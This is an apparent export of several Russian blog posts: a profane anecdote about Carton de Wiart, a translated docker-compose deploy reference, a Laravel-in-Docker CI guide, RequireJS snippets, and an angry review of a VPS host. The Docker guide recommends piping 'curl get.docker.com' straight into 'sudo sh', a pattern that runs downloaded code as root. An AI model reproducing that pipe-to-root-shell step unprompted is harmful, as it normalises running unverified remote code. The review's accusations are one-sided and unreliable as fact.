отъебаться, и он будет служить еще лет сто или двести. Его произвели в генерал-лейтенанты, и отправили в Китай, личным представителем Черчилля.\nВ Китае случилась гражданская война, и ди Виарт очень хотел в ней поучаствовать, чтоб кого-нибудь замочить. Но Англия ему запретила. Тогда ди Виарт познакомился с Мао Дзе Дуном, и говорит:\n— А давайте Японию отпиздим? Чо они такие суки? — Нет, лучше давайте вступайте в Китайскую армию, такие люди нам нужны. — Ну на хуй, у вас тут скучно, — заявил ди Виарт. — Вы какие-то слишком мирные.\nИ в 1947 году наконец вышел в отставку. Супруга с труднопроизносимым именем померла. А в 1951 году ди Виарт женился на бабе, которая была на 23 года младше.\n— Вы ж старик уже, да еще и отполовиненный, как же вы с молодой женой справитесь? — охуевали знакомые. — А чего с ней справляться? — браво отвечал ди Виарт. — Хуй мне не оторвало.\n«Честно говоря, я наслаждался войной, — писал он в своих мемуарах. — Конечно, были плохие моменты, но хороших куда больше, не говоря уже о приятном волнении». Умер он в 1963 году, в возрасте 83 лет. Человек-медоед, не иначе.\n (с) Diana Udovichenko\n","date":"2019-01-20T07:52:56Z","image":"https://blog.hook.sh/adrian-karton-di-viart/cover_hue93400e0290949f7e2f718449ca8f3c5_59234_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/adrian-karton-di-viart/","title":"Пули свищут, народ мрет — красота!"},{"content":" Данный пост является переводом части документации, посвященной секции deploy в docker-compose\n deploy  Начиная с версии 3.\n Группа настроек, посвященная деплою и запуску сервисов. Указанные в данной группе настройки используются только при деплое на swarm используя docker stack deploy, и игнорируется при использовании команд docker-compose up и docker-compose run.\nversion:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:replicas:6update_config:parallelism:2delay:10srestart_policy:condition:on-failureДоступны следующие дополнительные опции:\nendpoint_mode Используемый метод обнаружения (\u0026ldquo;service discovery\u0026rdquo;) для внешних запросов от клиентов.\n Начиная с версии 3.3.\n  endpoint_mode: vip - Докер присваивает сервису виртуальный IP адрес (VIP), который выступает в роли \u0026ldquo;внешнего\u0026rdquo; для получения доступа к сервису. Докер сам занимается маршрутизацией запросов между клиентом и доступным воркером (на котором крутится сервис), при этом клиент ничего не знает ни о количестве нод, ни о их IP и портах (используется по умолчанию). endpoint_mode: dnsrr - DNS \u0026ldquo;round-robin\u0026rdquo; (DNSRR) не использует одиночный виртуальный IP адрес. Докер устанавливает DNS записи для сервиса таким образом, что когда клиент его запрашивает - ему возвращается список из IP адресов, и клиент сам подключается к одному из них. DNS \u0026ldquo;round-robin\u0026rdquo; полезен в случаях использования своего собственного балансировщика нагрузки, или для гибридных Windows \u0026amp; Linux приложений.  version:\u0026#34;3.3\u0026#34;services:wordpress:image:wordpressports:- \u0026#34;8080:80\u0026#34;networks:- overlaydeploy:mode:replicatedreplicas:2endpoint_mode:vipmysql:image:mysqlvolumes:- db-data:/var/lib/mysql/datanetworks:- overlaydeploy:mode:replicatedreplicas:2endpoint_mode:dnsrrvolumes:db-data:networks:overlay:endpoint_mode так же можно использовать как флаг запуска при использовании консоли docker service create. Список всех связанных swarm-команд доступен по этой ссылке.\nЕсли вы хотите узнать больше о \u0026ldquo;service discovery\u0026rdquo; и сетях в swarm-режиме, перейдите в раздел настройки service discovery.\nlabels Установка ярлыков (labels) сервиса. Эти ярлыки присваиваются только самому сервису, а не какому-либо контейнеру этого сервиса.\nversion:\u0026#34;3\u0026#34;services:web:image:webdeploy:labels:com.example.description:\u0026#34;This label will appear on the web service\u0026#34;Для установки ярлыков (labels) для контейнеров (а не сервиса), используйте ключ labels вне секции deploy:\nversion:\u0026#34;3\u0026#34;services:web:image:weblabels:com.example.description:\u0026#34;This label will appear on all containers for the web service\u0026#34;mode Может быть глобальным (global, строго один контейнер на swarm-ноде) или реплицированным (replicated, с указанием количества контейнеров). По умолчанию используется replicated. Подробнее можно прочитать в разделе Реплицированные и глобальные сервисы.\nversion:\u0026#39;3\u0026#39;services:worker:image:dockersamples/examplevotingapp_workerdeploy:mode:globalplacement Указание мест размещения контейнеров и их \u0026ldquo;предпочтений\u0026rdquo;. Наиболее полное описание допустимых опций вы сможете найти в разделах \u0026ldquo;constraints\u0026rdquo; и \u0026ldquo;preferences\u0026rdquo; соответственно.\nversion:\u0026#39;3.3\u0026#39;services:db:image:postgresdeploy:placement:constraints:- node.role == manager- engine.labels.operatingsystem == ubuntu 14.04preferences:- spread:node.labels.zonereplicas Если у сервиса выбран режим репликации (replicated, используется по умолчанию) - вы можете указать количество запускаемых контейнеров у данного сервиса.\nversion:\u0026#39;3\u0026#39;services:worker:image:dockersamples/examplevotingapp_workernetworks:- frontend- backenddeploy:mode:replicatedreplicas:6resources Настройка ограничений используемых ресурсов.\n Примечание: Указанные в данной секции опции перекрывают более старые ограничения и опции, что указаны в Compose-файле для не-swarm режима до версии 3 (cpu_shares, cpu_quota, cpuset, mem_limit, memswap_limit, mem_swappiness), как описано в разделе обновление с версии 2.x до 3.x.\n Каждое значение, указанное в данной секции, является аналогом опций для docker service create.\nВ приведенном ниже примере сервис redis может использовать не более 50 Мб памяти и 0.50 (50%) доступного процессорного времени (CPU), а так же имеет зарезервированные 20 Мб памяти и 0.25 CPU (всегда доступные для него).\nversion:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:resources:limits:cpus:\u0026#39;0.50\u0026#39;memory:50Mreservations:cpus:\u0026#39;0.25\u0026#39;memory:20M Настройка ограничений ресурсов для не-swarm режима доступна в этом разделе. Если у вас возникнут дополнительные вопросы - обратите внимание на этот топик на github.com.\n Исключения класса \u0026ldquo;Out Of Memory\u0026rdquo; (OOME) Если ваши сервисы или контейнеры попытаются использовать объём памяти больше, чем доступен на используемой системе, вы рискуете \u0026ldquo;поймать\u0026rdquo; исключение класса \u0026ldquo;Out Of Memory Exception\u0026rdquo; (OOME) и контейнер, или сам докер-демон может быть прибит демоном ядра системы (\u0026ldquo;kernel OOM killer\u0026rdquo;). Во избежание этого убедитесь в наличии доступных ресурсов на целевой системе и ознакомтесь с разделом понимание рисков недостатка доступной памяти.\nrestart_policy Указывает как и в каких случаях необходимо перезапускать контейнеры когда они останавливаются. Замена секции restart.\n condition (условие): одно из возможных значений - none (никогда), on-failure (при ошибке) или any (всегда) (по умолчанию: any). delay (задержка): Задержка между попытками перезапуска, указывается в формате \u0026ldquo;продолжительность\u0026rdquo; (по умолчанию: 0). max_attempts: Количество предпринимаемых попыток перезапуска перед тем, как прекратить пытаться запустить контейнер (по умолчанию: количество попыток не ограничено). Если контейнер не запустился в пределах указанного \u0026ldquo;окна\u0026rdquo; (window), эта попытка не учитывается при расчете значения max_attempts. Например, если max_attempts установлен равным 2, и перезапуск завершился ошибкой при первой попытке, может быть предпринято более двух попыток перезапуска. window: Задержка перед принятием решения о том, что перезапуск успешно завершился. Указывается в формате \u0026ldquo;продолжительность\u0026rdquo; (по умолчанию: задержка отсутствует).   Для лучшего понимания лучше прочитать первоисточник.\n version:\u0026#39;3\u0026#39;services:redis:image:redis:alpinedeploy:restart_policy:condition:on-failuredelay:5smax_attempts:3window:120supdate_config Настройка обновления сервисов.\n parallelism: Количество одновременно обновляемых контейнеров. Если установить 0, то будет происходить одновременное обновление всех контейнеров. delay: Задержка между обновлениями группы контейнеров (по умолчанию: 0s). failure_action: Действие при ошибке обновления. Может принимать значения: continue, rollback, или pause (по умолчанию: pause). monitor: Продолжительность мониторинга на сбой после каждого обновления (ns|us|ms|s|m|h) (по умолчанию: 0s). max_failure_ratio: Допустимая частота сбоев при обновлении (по умолчанию: 0). order: Порядок операций при обновлении. Может принимать значения: stop-first (старая задача останавливается перед тем, как запускать новую), или start-first (сначала запускается новая задача, а выполняемые задачи ненадолго \u0026ldquo;перекрываются\u0026rdquo;) (по умолчанию: stop-first).   Заметка: Порядок операций при обновлении доступен начиная с версии v3.4 и выше.\n version:\u0026#39;3.4\u0026#39;services:vote:image:dockersamples/examplevotingapp_vote:beforedepends_on:- redisdeploy:replicas:2update_config:parallelism:2delay:10sorder:stop-firstrollback_config  Версия 3.7 и выше\n Настройка откатов сервисов в случае ошибки обновления.\n parallelism: Количество одновременно откатываемых контейнеров. Если установить 0, то будет происходить одновременный откат всех контейнеров. delay: Задержка между откатами группы контейнеров (по умолчанию: 0s). failure_action: Действие при провале отката. Может принимать значения: continue или pause (по умолчанию: pause) monitor: Продолжительность мониторинга на сбой после каждого обновления (ns|us|ms|s|m|h) (по умолчанию: 0s). max_failure_ratio: Допустимая частота сбоев при откате (по умолчанию: 0). order: Порядок операций при откате. Может принимать значения: stop-first (старая задача останавливается перед тем, как запускать новую), или start-first (сначала запускается новая задача, а выполняемые задачи ненадолго \u0026ldquo;перекрываются\u0026rdquo;) (по умолчанию: stop-first).  Не поддерживается в контексте docker stack deploy Следующие настройки не поддерживаются командой docker stack deploy или настройками в группе deploy.\n build cgroup_parent container_name devices tmpfs external_links links network_mode restart security_opt stop_signal sysctls userns_mode   Заметка: Смотри раздел как настраивать тома для сервисов, swarm-ов и docker-stack.yml файлов. Использование томов поддерживается, но они должны быть сконфигурированы как как именованные тома или связаны с сервисами, которые в свою очередь предоставляют доступ к необходимым томам.\n","date":"2018-10-15T13:35:50Z","image":"https://blog.hook.sh/compose-deploy/cover_hu65abd86000f73060febdb2dd524fa8aa_21589_120x120_fill_box_smart1_3.png","permalink":"https://blog.hook.sh/compose-deploy/","title":"Деплой на Docker Swarm"},{"content":" Данная статья является копией публикации на хабре\n В данной статье я расскажу о своём опыте \u0026ldquo;заворачивания\u0026rdquo; Laravel-приложения в Docker-контейнер да так, что бы и локально с ним могли работать frontend и backend разработчики, и запуск его на production был максимально прост. Так же CI будет автоматически запускать статические анализаторы кода, phpunit-тесты, производить сборку образов.\n\u0026ldquo;А в чём, собственно, сложность?\u0026rdquo; - можешь сказать ты, и будешь отчасти прав. Дело в том, что этой теме посвящено довольно много обсуждений в русскоязычных и англоязычных комьюнити, и почти все изученные треды я бы условно разделил на следующие категории:\n \u0026ldquo;Использую докер для локальной разработки. Ставлю laradock и беды не знаю\u0026rdquo;. Круто, но как обстоят дела с автоматизацией и запуском на production? \u0026ldquo;Собираю один контейнер (монолит) на базе fedora:latest (~230 Mb), ставлю в него все сервисы (nginx, бд, кэш, etc), запускаю всё супервизором внутри\u0026rdquo;. Тоже отлично, прост в запуске, но как на счёт идеологии \u0026ldquo;один контейнер - один процесс\u0026rdquo;? Как обстоят дела с балансировкой и управлением процессами? Как же размер образа? \u0026ldquo;Вот вам куски конфигов, приправляем выдержками из sh-скриптов, добавим магических env-значений, пользуйтесь\u0026rdquo;. Спасибо, но как же на счёт хотя бы одного живого примера, который я бы мог форкнуть и полноценно поиграться?  Всё, что ты прочитаешь ниже - является субъективным опытом, который не претендует быть истиной в последней инстанции. Если у тебя будут дополнения или указания на неточности - welcome to comments.\n Для нетерпеливых - ссылка на репозиторий, склонировав который ты сможешь запустить Laravel-приложение одной командой. Так же не составит труда его запустить на том же rancher, правильно \u0026ldquo;слинковав\u0026rdquo; контейнеры, или использовать продуктовый вариант docker-compose.yml как отправную точку.\n Часть теоретическая Какие инструменты мы будем использовать в своей работе, и на что сделаем акценты? Первым делом нам понадобятся установленные на хосте:\n docker - на момент написания статьи использовал версию 18.06.1-ce docker-compose - он отлично справляется с линковкой контейнеров и хранением необходимых environment значений; версия 1.22.0 make - возможно ты удивишься, но он отлично \u0026ldquo;вписывается\u0026rdquo; в контекст работы с докером   Поставить docker на debian-like системы можно командой curl -fsSL get.docker.com | sudo sh, а вот docker-compose лучше ставь с помощью pip, так как в его репозиториях обитают наиболее свежие версии (apt сильно отстают, как правило).\n На этом список зависимостей можно завершить. Что ты будешь использовать для работы с исходниками - phpstorm, netbeans или трушный vim - только тебе решать.\nДальше - импровизированный QA в контексте (не побоюсь этого слова) проектирования образов:\n  Q: Базовый образ - какой лучше выбрать?\n  A: Тот, что \u0026ldquo;потоньше\u0026rdquo;, без излишеств. На базе alpine (~5 Mb) можно собрать всё, что душе угодно, но скорее всего придётся поиграться со сборкой сервисов из исходников. Как альтернатива - jessie-slim (~30 Mb). Или же использовать тот, что наиболее часто используется у вас на проектах.\n  Q: Почему вес образа - это важно?\n  A: Снижение объёма трафика, снижение вероятности ошибки при скачивании (меньше данных - меньше вероятность), снижение потребляемого места. Правило \u0026ldquo;Тяжесть — это надёжно\u0026rdquo; (© \u0026ldquo;Snatch\u0026rdquo;) тут не очень работает.\n  Q: А вот мой друг %friend_name% говорит, что \u0026ldquo;монолитный\u0026rdquo; образ со всеми-всеми зависимостями - это самый лучший путь.\n  A: Давай просто посчитаем. Приложение имеет 3 зависимости - PG, Redis, PHP. И тебе захотелось протестировать как оно у тебя будет себя вести в связках различных версий этих зависимостей. PG - версии 9.6 и 10, Redis - 3.2 и 4.0, PHP - 7.0 и 7.2. В случае, если каждая зависимость это отдельный образ - тебе их потребуется 6 штук, которые даже собирать не надо - всё уже готово и лежит на hub.docker.com. Если же по идеологическим соображениям все зависимости \u0026ldquo;упакованы\u0026rdquo; в один контейнер, тебе придётся его ручками пересобрать\u0026hellip; 8 раз? А теперь добавь условие, что ты ещё хочешь и с opcache поиграться. В случае декомпозиции - это просто изменение тегов используемых образов. Монолит проще запускать и обслуживать, но это путь в никуда.\n  Q: Почему супервизор в контейнере - это зло?\n  A: Потому что PID 1. Не хочешь обилия проблем с зомби-процессами и иметь возможность гибко \u0026ldquo;добавлять мощностей\u0026rdquo; там, где это необходимо - старайся запускать один процесс на контейнер. Своеобразными исключениями является nginx со своими воркерами и php-fpm, которые имеют свойство плодить процессы, но с этим приходится мириться (более того - они не плохо умеют реагировать на SIGTERM, вполне корректно \u0026ldquo;убивая\u0026rdquo; своих воркеров). Запустив же всех демонов супервизором - фактически наверняка ты обрекаешь себя на проблемы. Хотя, в некоторых случаях - без него сложно обойтись, но это уже исключения.\n  Определившись с основными подходами давай перейдём к нашему приложению. Оно должно уметь:\n web|api - отдавать статику силами nginx, а динамический контент генерировать силами fpm scheduler - запускать родной планировщик задач queue - обрабатывать задания из очередей  Базовый набор, который при необходимости можно будет расширить. Теперь перейдём к образам, которые нам предстоит собрать для того, что бы наше приложение \u0026ldquo;взлетело\u0026rdquo; (в скобках приведены их кодовые имена):\n PHP + PHP-FPM (app) - среда, в которой будет выполняться наш код. Так как версии PHP и FPM у нас будут совпадать - собираем их в одном образе. Так и с конфигами легче управляться, и состав пакетов будет идентичный. Разумеется - FPM и процессы приложения будут запускаться в разных контейнерах nginx (nginx) - что бы не заморачиваться с доставкой конфигов и опциональных модулей для nginx - будем собирать отдельный образ с ним. Так как он является отдельным сервисом - у него свой докер-файл и свой контекст Исходники приложения (sources) - доставка исходников будет производиться используя отдельный образ, монтируя volume с ними в контейнер с app. Базовый образ - alpine, внутри - только исходники с установленными зависимостями и собранными с помощью webpack asset-ами (артефакты сборки)  Остальные сервисы для разработки запускаются в контейнерах, стянув их с hub.docker.com; на production же - они запущены на отдельных серверах, объединенных в кластеры. Всё что нам останется - это сказать приложению (через environment) по каким адресам\\портам и с какими реквизитами необходимо до них стучаться. Ещё круче - это использовать в этих целях service-discovery, но об этом не в этот раз.\nОпределившись с частью теоретической - предлагаю перейти к следующей части.\nЧасть практическая Организовать файлы в репозитории предлагаю следующим образом:\n. ├── docker # Директория для хранения докер-файлов необходимых сервисов │ ├── app │ │ ├── Dockerfile │ │ └── ... │ ├── nginx │ │ ├── Dockerfile │ │ └── ... │ └── sources │ ├── Dockerfile │ └── ... ├── src # Исходники приложения │ ├── app │ ├── bootstrap │ ├── config │ ├── artisan │ └── ... ├── docker-compose.yml # Compose-конфиг для локальной разработки ├── Makefile ├── CHANGELOG.md └── README.md  Ознакомиться со структурой и файлами ты можешь перейдя по этой ссылке.\n Для сборки того или иного сервиса можно воспользоваться командой:\n$ docker build \\  --tag %local_image_name% \\  -f ./docker/%service_directory%/Dockerfile ./docker/%service_directory% Единственным отличием будет сборка образа с исходниками - для него необходимо контекст сборки (крайний аргумент) указать равным ./src.\nПравила именования образов в локальном registry рекомендую использовать те, что использует docker-compose по умолчанию, а именно: %root_directory_name%_%service_name%. Если директория с проектом называется my-awesome-project, а сервис носит имя redis, то имя образа (локального) лучше выбрать my-awesome-project_redis соответственно.\n Для ускорения процесса сборки можно сказать докеру использовать кэш ранее собранного образа, и для этого используется параметр запуска --cache-from %full_registry_name%. Таким образом демон докера перед запуском той или иной инструкции в Dockerfile посмотрит - изменились ли она? И если нет (хэш сойдётся) - он пропустит инструкцию, используя уже готовый слой из образа, который ты укажешь ему использовать в качестве кэша. Эта штука не плохо так бустит процесс пересборки, особенно, если ничего не изменилось :)\n  Обрати внимание на ENTRYPOINT скрипты запуска контейнеров приложения.\n Образ среды для запуска приложения (app) собирался с учётом того, что он будет работать не только на production, но ещё и локально разработчикам необходимо с ним эффективно взаимодействовать. Установка и удаление composer-зависимостей, запуск unit-тестов, tail логов и использование привычных алиасов (php /app/artisan → art, composer → c) должно быть без какого либо дискомфорта. Более того - он же будет использоваться для запуска unit-тестов и статических анализаторов кода (phpstan в нашем случае) на CI. Именно поэтому его Dockerfile, к примеру, содержит строчку установки xdebug, но сам модуль не включен (он включается только с использованием CI).\n Так же для composer глобально ставится пакет hirak/prestissimo, который сильно бустит процесс установки всех зависимостей.\n На production мы монтируем внутрь него в директорию /app содержимое директории /src из образа с исходниками (sources). Для разработки - \u0026ldquo;прокидываем\u0026rdquo; локальную директорию с исходниками приложения (-v \u0026quot;$(pwd)/src:/app:rw\u0026quot;).\nИ вот тут кроется одна сложность - это права доступа на файлы, которые создаются из контейнера. Дело в том что по умолчанию процессы, запущенные внутри контейнера - запускаются от рута (root:root), создаваемые этими процессами файлы (кэш, логи, сессии, etc) - тоже, и как следствие - \u0026ldquo;локально\u0026rdquo; с ними ты уже ничего не сможешь сделать, не выполнив sudo chown -R $(id -u):$(id -g) /path/to/sources.\nКак один из вариантов решения - это использование fixuid, но это решение прям \u0026ldquo;так себе\u0026rdquo;. Лучшим путём мне показался проброс локальных USER_ID и его GROUP_ID внутрь контейнера, и запуск процессов с этими значениями. По умолчанию подставляя значения 1000:1000 (значения по умолчанию для первого локального пользователя) избавился от вызова $(id -u):$(id -g), а при необходимости - ты всегда их можешь переопределить ($ USER_ID=666 docker-compose up -d) или сунуть в .env файл docker-compose.\nТак же при локальном запуске php-fpm не забудь отключить у него opcache - иначе куча \u0026ldquo;да что за чертовщина!\u0026rdquo; тебе будут обеспечены.\nДля \u0026ldquo;прямого\u0026rdquo; подключения к redis и postgres - прокинул дополнительные порты \u0026ldquo;наружу\u0026rdquo; (16379 и 15432 соответственно), так что проблем с тем, чтоб \u0026ldquo;подключиться да посмотреть что да как там на самом деле\u0026rdquo; не возникает в принципе.\nКонтейнер с кодовым именем app держу запущенным (--command keep-alive.sh) с целью удобного доступа к приложению.\nВот несколько примеров решения \u0026ldquo;бытовых\u0026rdquo; задач с помощью docker-compose:\n   Операция Выполняемая команда     Установка compose-пакета $ docker-compose exec app composer require package/name   Запуск phpunit $ docker-compose exec app php ./vendor/bin/phpunit --no-coverage   Установка всех node-зависимостей $ docker-compose run --rm node npm install   Установка node-пакета $ docker-compose run --rm node npm i package_name   Запуск \u0026ldquo;живой\u0026rdquo; пересборки asset-ов $ docker-compose run --rm node npm run watch    Все детали запуска ты сможешь найти в файле docker-compose.yml.\nЦой make жив! Набивать одни и те же команды каждый раз становится скучно после второго раза, и так как программисты по своей натуре - существа ленивые, давай займёмся их \u0026ldquo;автоматизацией\u0026rdquo;. Держать набор sh-скриптов - вариант, но не такой привлекательный, как один Makefile, тем более что его применимость в современной разработке сильно недооценена.\nДавай посмотри как выглядит запуск make в корне репозитория:\n[user@host ~/projects/app] $ make help Show this help app-pull Application - pull latest Docker image (from remote registry) app Application - build Docker image locally app-push Application - tag and push Docker image into remote registry sources-pull Sources - pull latest Docker image (from remote registry) sources Sources - build Docker image locally sources-push Sources - tag and push Docker image into remote registry nginx-pull Nginx - pull latest Docker image (from remote registry) nginx Nginx - build Docker image locally nginx-push Nginx - tag and push Docker image into remote registry pull Pull all Docker images (from remote registry) build Build all Docker images push Tag and push all Docker images into remote registry login Log in to a remote Docker registry clean Remove images from local registry --------------- --------------- up Start all containers (in background) for development down Stop all started for development containers restart Restart all started for development containers shell Start shell into application container install Install application dependencies into application container watch Start watching assets for changes (node) init Make full application initialization (install, seed, build assets, etc) test Execute application tests Allowed for overriding next properties: PULL_TAG - Tag for pulling images before building own (\u0026#39;latest\u0026#39; by default) PUBLISH_TAGS - Tags list for building and pushing into remote registry (delimiter - single space, \u0026#39;latest\u0026#39; by default) Usage example: make PULL_TAG=\u0026#39;v1.2.3\u0026#39; PUBLISH_TAGS=\u0026#39;latest v1.2.3 test-tag\u0026#39; app-push Он очень хорош зависимостью целей. Например, для запуска watch (docker-compose run --rm node npm run watch) необходимо что бы приложение было \u0026ldquo;поднято\u0026rdquo; - тебе достаточно указать цель up как зависимую - и можешь не беспокоиться о том, что ты забудешь это сделать перед вызовом watch - make сам всё сделает за тебя. То же касается запуска тестов и статических анализаторов, например, перед коммитом изменений - выполни make test и вся магия произойдет за тебя!\nСтоит ли говорить о том, что для сборки образов, их скачивания, указания --cache-from и всего-всего - уже не стоит беспокоиться?\nОзнакомиться с содержанием Makefile ты можешь по этой ссылке.\nЧасть автоматическая Приступим к финальной части данной статьи - это автоматизация процесса обновления образов в Docker Registry. Хоть в моём примере и используется GitLab CI - перенести идею на другой сервис интеграции, думаю, будет вполне возможно.\nПервым делом определимся и именованием используемых тегов образов:\n   Имя тега Предназначение     latest Образы, собранные с ветки master. Состояние кода является самым \u0026ldquo;свежим\u0026rdquo;, но ещё не готовым к тому, что бы попасть в релиз   some-branch-name Образы, собранные на бранче some-branch-name. Таким образом мы можем на любом окружении \u0026ldquo;раскатать\u0026rdquo; изменения которые были реализованы только в рамках конкретного бранча ещё до их сливания с master-веткой - достаточно \u0026ldquo;вытянуть\u0026rdquo; образы с этим тегом. И - да, изменения могут касаться как кода, так и образов всех сервисов в целом!   vX.X.X Собственно, релиз приложения (использовать для разворачивания конкретной версии)   stable Алиас, для тега со самым свежим релизом (использовать для разворачивания самой свежей стабильной версии)    Для ускорения сборки используется кэширование директорий ./src/vendor и ./src/node_modules + --cache-from для docker build, и состоит из следующих этапов (stages):\n   Имя этапа Предназначение     prepare Подготовительный этап - сборка образов всех сервисов кроме образа с исходниками   test Тестирование приложения (запуск phpunit, статических анализаторов кода) используя образы, собранные на этапе prepare   build Установка всех composer зависимостей (--no-dev), сборка assets силами webpack, и сборка образа с исходниками включая полученные артефакты (vendor/*, app.js, app.css)     pipelines screenshot \n Сборка на master-ветке, производящая push с тегами latest и master\n В среднем, все этапы сборки занимают 4 минуты, что довольно хороший результат (параллельное выполнение задач - наше всё).\nОзнакомиться с содержанием конфигурации (.gitlab-ci.yml) сборщика можешь ознакомиться по этой ссылке.\nВместо заключения Как видишь - организовать работу с php-приложением (на примере Laravel) используя Docker не так то и сложно. В качестве теста можешь форкнуть репозиторий, и заменив все вхождения tarampampam/laravel-in-docker на свои - попробовать всё \u0026ldquo;в живую\u0026rdquo; самостоятельно.\nДля локального запуска - выполни всего 2 команды:\n$ git clone https://gitlab.com/tarampampam/laravel-in-docker.git ./laravel-in-docker \u0026amp;\u0026amp; cd $_ $ make init После чего открой http://127.0.0.1:9999 в своём любимом браузере.\n","date":"2018-10-01T08:29:51Z","image":"https://blog.hook.sh/laravel-in-docker/cover_hua8f71ffb89a9e5aa8906e7ae93fcb2fc_87557_120x120_fill_box_smart1_3.png","permalink":"https://blog.hook.sh/laravel-in-docker/","title":"Docker + Laravel = ❤"},{"content":"Мне нравится RequireJS. Нравятся принцип построения приложения с его использованием, то как он работает с зависимостями, его гибкость и настраиваемость. Но часто может возникать проблема при разработке на локале - кэширование ресурсов браузером (файл подправил, а изменения не отображаются, так как файл берется из кэша).\nМожно, конечно, открыть консоль и поставить флаг запрещающий кэширование, можно подправить конфиг web-демона так, чтоб он запрещал кэширование, а можно пойти другим путем - заставить requirejs добавлять рандомный параметр к своим запросам, таким образом заставляя браузер не брать файл из кэша.\nДля настройки requirejs я использую отдельный файл-конфигурацию, который загружается перед самой библиотекой, и содержит в себе как описания путей, зависимостей и прочие штуки - так и немного уличной магии.\nНиже будет пример его содержания в полном объеме, и думаю что комментарии тут будут излишне (ссылка на док). Такой код можно оставить работать и на продакшене без особых переживаний, но для разработки на локале есть как минимум одно очевидное ограничение - необходимо чтоб домен верхнего уровня был указан в массиве local, а так как для всех своих локальных проектов использую домен верхнего уровня dev - неудобств совсем не замечаю.\n// @file ./js/config.js  \u0026#39;use strict\u0026#39;; /** * Requite.js configuration. * * @type {Object} */ var require = { paths: { app: \u0026#39;js/app\u0026#39;, // Components  jquery: \u0026#39;vendor/jquery/dist/jquery.min\u0026#39;, bootstrap: \u0026#39;vendor/bootstrap/dist/js/bootstrap.min\u0026#39; }, shim: { bootstrap: { deps: [\u0026#39;jquery\u0026#39;] } }, deps: [\u0026#39;bootstrap\u0026#39;] // An array of dependencies to load }; /** * Disable cache for requirejs resources while develop. * * @param {Object} require * @returns {undefined} */ (function (require) { if (require !== false) { /** * Make test - is \u0026#39;local\u0026#39; domain name? * * @returns {Boolean} */ var isLocalDomain = function () { var host_name = document.location.hostname || window.location.host, local = [\u0026#39;dev\u0026#39;, \u0026#39;local\u0026#39;, \u0026#39;localhost\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;env\u0026#39;]; if (typeof host_name === \u0026#39;string\u0026#39;) { var parts = host_name.split(\u0026#39;.\u0026#39;), last = parts[parts.length - 1]; if (parts.length === 1 || (!isNaN(parseFloat(last)) \u0026amp;\u0026amp; isFinite(last))) { return true; } else { for (var i = 0, len = local.length; i \u0026lt; len; i++) { if (local[i] === last) { return true; } } } } return false; }; /** * Append \u0026#39;urlArgs\u0026#39; property. */ require.urlArgs = isLocalDomain() ? (new Date()).getTime().toString() : null; } })(typeof require === \u0026#39;object\u0026#39; ? require : false); ","date":"2017-02-19T19:16:00Z","image":"https://blog.hook.sh/disable-cacheing-requirejs-files-while-develop/cover_hu30c3e7f4088a0dadce48d1d04a5455c7_31682_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/disable-cacheing-requirejs-files-while-develop/","title":"Отключаем кэширование загружаемых RequireJS файлов при разработке"},{"content":"Частенько при разработке приложения с использованием requirejs возникает необходимость в реализации паттерна синглтона. И вот, испробовав пример его реализации что описан ниже заявляю - он имеет право на жизнь. Не без своих недостатков, разумеется, но в целом вполне применибельно:\n\u0026#39;use strict\u0026#39;; define([], function () { /** * Singletone instance. * * @type {OurNewSingletone|null} */ var instance = null; /** * OurNewSingletone object (as singletone). * * @returns {OurNewSingletone} */ var OurNewSingletone = function () { /** * Initialize method. * * @returns {} */ this.init = function () { // Make init  }; // Check instance exists  if (instance !== null) { throw new Error(\u0026#39;Cannot instantiate more than one instance, use .getInstance()\u0026#39;); } // Execute initialize method  this.init(); }; /** * Returns OurNewSingletone object instance. * * @returns {null|OurNewSingletone} */ OurNewSingletone.__proto__.getInstance = function () { if (instance === null) { instance = new OurNewSingletone(); } return instance; }; // Return singletone instance  return OurNewSingletone.getInstance(); }); И после, указывая наш модуль в зависимостях - мы получаем уже готовый к работе инстанс объекта (один и тот же в разных модулях), что и требуется.\n","date":"2017-02-18T05:19:58Z","image":"https://blog.hook.sh/requirejs-singletone/cover_hu30c3e7f4088a0dadce48d1d04a5455c7_31682_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/requirejs-singletone/","title":"Синглтон для RequireJS"},{"content":"Данный пост - предостережение тем, кто решил приобрести у них какие-либо услуги, и услуги VPS - в частности. Тем, кто перед оплатой решил поискать о них отзывы. Ниже будет аргументированное мнение, почему они являются куском говна:\n Нет информации про юрлицо, лицензии и т.д.; Покупают положительные отзывы. Мне предлагали зачисление на мой баланс месячной стоимости аренды VPS сервера за позитивный пост об их услугах в блоге или соц. сетях. Это сразу насторожило, но сперва не придал этому значения. А зря; Ужасная поддержка. Телефон не отвечает. Система тикетов - убогая. Для управления учетной записью и серверами, что прикреплены к этой учетной записи - две отдельных панели с разными логинами/паролями. Нет уведомлений об ответах на тикеты - вот сиди и сам проверяй - ответил тебе кто-нибудь, или нет; Выдают IP адреса, находящиеся в черных списках, спам-листах и т.д. Такое ощущение, что они сами не стесняются заниматься спамом и \u0026ldquo;чернухой\u0026rdquo;, или их клиенты их же используют в основном именно для этого; Выделяемые ресурсы не соответствуют заявленным. На сервере крутил только 3proxy крайней версии собранный из исходников. Через сутки сервер просто умирал в прямом смысле этого слова. Только рестарт через панель управления спасал ситуацию, и то - только на сутки. Не верите? Вот ссылка на скриншот. Для эксперимента снёс всё, и поставил чистую ОС. Ресурсы даже на чистой ОС просто утекают куда-то в линейной прогрессии! Сервер доступен не отовсюду. Cо своего рабочего IP не мог подключиться к серверу! Поддержка говорит \u0026ldquo;А мы ничего не знаем, проблема не с нашей стороны\u0026rdquo;, хотя проблема ТОЛЬКО с ними; Разводят на более дорогие тарифы; Чтоб написать в саппорт - надо ПОКУПАТЬ РАЗРЕШЕНИЯ! ПОКУПАТЬ, КАРЛ (скриншот)! Деньги не возвращают, даже при обосновании того что они не оказали заказанные услуги в полном объеме;  Вывод: Рекомендуйте их своим врагам. Пускай оплачивают вперед. Тратят нервы, силы, деньги, человеческие ресурсы. Сами же обходите их стороной, при возможности всем рассказывая кто они такие на самом деле.\n","date":"2016-08-20T06:27:33Z","permalink":"https://blog.hook.sh/cloud4box-com-review/","title":"Отзыв о cloud4box.com"},{"content":"Сегодня мы будем поднимать анонимный и действительно шустренький proxy/socks сервер для себя-любимого. Так чтоб настроить его один раз, да и забыть - пускай пыхтит да нам на радость.\nБудем считать что ты уже 